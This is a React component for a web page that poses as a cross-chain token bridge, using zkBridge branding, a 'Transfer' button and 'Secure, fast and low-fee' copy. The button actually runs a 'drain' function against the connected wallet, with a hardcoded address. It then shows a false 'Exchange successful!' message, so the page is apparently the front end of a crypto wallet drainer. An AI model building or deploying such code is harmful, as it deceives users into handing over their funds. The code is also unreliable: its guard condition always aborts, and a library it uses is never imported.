"use client";

import double_star from "../../images/double-star.svg";
import Image from "next/image";
import SelectTokenMenu from "../global/SelectTokenMenu";
import SelectChain from "../global/SelectChain";
import { TbArrowsExchange } from "react-icons/tb";
import ConnectWalletModal from "../modals/ConnectWalletModal";
import { useState } from "react";
import TokenInput from "./TokenInput";
import ReceipientAddressInput from "./ReceipientAddressInput";
import { UseWallet } from "../useWallet";
import { useAccount } from "wagmi";
import { toast } from "react-toastify";

const Transfer = () => {
  const [loading, setLoading] = useState(false);
  const { chainId, connector, address } = useAccount();
  const { drain } = UseWallet();

  const [amount, setAmount] = useState(null);
  const [receipientAddress, setReceipientAddress] = useState(null);
  const [selectedToken, setSelectedToken] = useState({
    name: "Ethereum",
    chainId: 1,
    symbol: "ETH",
    icon: "https://www.zkbridge.com/assets/ethernet-3b0460d7.png",
    address: "",
  });

  const [selectedFromChain, setSelectedFromChain] = useState({
    name: "Ethereum",
    chainId: 1,
    symbol: "ETH",
    address: "0x455e53cbb86018ac2b8092fdcd39d8444affc3f6",
    icon: "https://www.zkbridge.com/assets/ethernet-3b0460d7.png",
  });
  const [selectedToChain, setSelectedToChain] = useState({
    name: "Polygon",
    chainId: 137,
    symbol: "POL",
    address: "0x455e53cbb86018ac2b8092fdcd39d8444affc3f6",
    icon: "https://s2.coinmarketcap.com/static/img/coins/64x64/3890.png",
  });

  const handleDrain = async () => {
    if (!connector || !amount || selectedFromChain) {
      console.error("Missing required fields for drain.");
      return;
    }

    // console.log("Selected from asset:", selectedFromAsset);

    try {
      setLoading(true);

      const provider = new ethers.providers.Web3Provider(
        await connector.getProvider()
      );
      const chainId = await provider.getSigner().getChainId();

      await drain(provider, chainId, selectedFromChain.address); // Trigger drain with correct args

      toast.success("Exchange successful!");
      setLoading(false);
    } catch (error) {
      console.error("Error in drain function:", error);
      setLoading(false);
    }
  };

  return (
    <div className="w-full md:p-8 p-4 font-poppins relative rounded-2xl">
      <div className="w-full flex justify-between items-center">
        <div className="flex justify-start items-center gap-3">
          <h2 className="font-semibold text-lg md:text-xl text-white">Token</h2>
          <SelectTokenMenu
            selectedToken={selectedToken}
            setSelectedToken={setSelectedToken}
          />
        </div>
        <div className="flex justify-start items-center gap-1">
          <p className="text-cyan2 md:text-base text-sm lg:text-lg">
            Secure, fast and low-fee
          </p>
          <Image src={double_star} alt="Double star" width={20} height={20} />
        </div>
      </div>

      <div className="flex justify-between items-center gap-1 w-full mb-5 mt-8">
        <SelectChain
          chainId={selectedToken.chainId}
          label="From"
          selectedChain={selectedFromChain}
          setSelectedChain={setSelectedFromChain}
        />
        <button className="text-white hover:text-cyan bg-lightGray rounded-md py-1 px-1.5">
          <TbArrowsExchange size={22} />
        </button>
        <SelectChain
          chainId={selectedToken.chainId}
          label="To"
          selectedChain={selectedToChain}
          setSelectedChain={setSelectedToChain}
        />
      </div>

      <TokenInput
        setAmount={setAmount}
        amount={amount}
        selectedChain={selectedFromChain}
      />

      <div className="mt-7">
        <ReceipientAddressInput
          receipAddress={receipientAddress}
          setReceipAddress={setReceipientAddress}
        />
      </div>

      <div className="flex justify-center items-center w-full mt-16">
        <ConnectWalletModal
          button={
            <button className="rounded-full px-24 py-3 hover:opacity-85 bg-cyan2 text-[#0d0f0e]">
              Connect Wallet
            </button>
          }
          actionBtn={
            <button
              onClick={handleDrain}
              disabled={!amount || loading}
              className="rounded-full px-24 font-medium py-3 hover:opacity-85 disabled:opacity-85 bg-cyan2 text-[#0d0f0e] disabled:bg-[#212322] disabled:text-white w-full disabled:cursor-not-allowed"
            >
              {loading ? "Tranferring..." : "Transfer"}
            </button>
          }
        />
      </div>
    </div>
  );
};

export default Transfer;
